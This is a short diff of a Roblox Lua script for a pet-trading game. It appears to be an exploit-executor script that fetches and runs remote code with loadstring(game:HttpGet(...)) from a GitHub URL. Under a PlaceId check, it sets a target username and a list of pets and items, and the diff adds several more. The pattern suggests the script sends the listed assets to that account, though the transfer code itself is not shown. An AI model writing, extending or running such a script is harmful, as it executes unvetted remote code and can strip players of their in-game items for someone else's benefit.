@@ -4,8 +4,9 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-9
 if game.PlaceId == 8737899170 then
     Username = "REyifpof"
     getgenv().PetToTrade = {
-        {Pet = "Hacked Computer", Patern = all, DecrementBy = 0}
-        --{Pet = "Pineapple Monkey", Patern = 2}
+        {Pet = "Elegant Eagle", Patern = all, DecrementBy = 0},
+        {Pet = "Lune Axolotl", Patern = all, DecrementBy = 0}
+        --{Pet = "Pineapple Monkey", Patern = 2, DecrementBy = 0}
 
 
     }
@@ -40,7 +41,8 @@ if game.PlaceId == 8737899170 then
         "Ultra Lucky Tile",
         "Lucky Tile",
         "Good vs Evil Gift",
-        "Rave Gift"
+        "Rave Gift",
+        "Millionaire Bucks"
 }
 
     local library = require(game.ReplicatedStorage.Library)
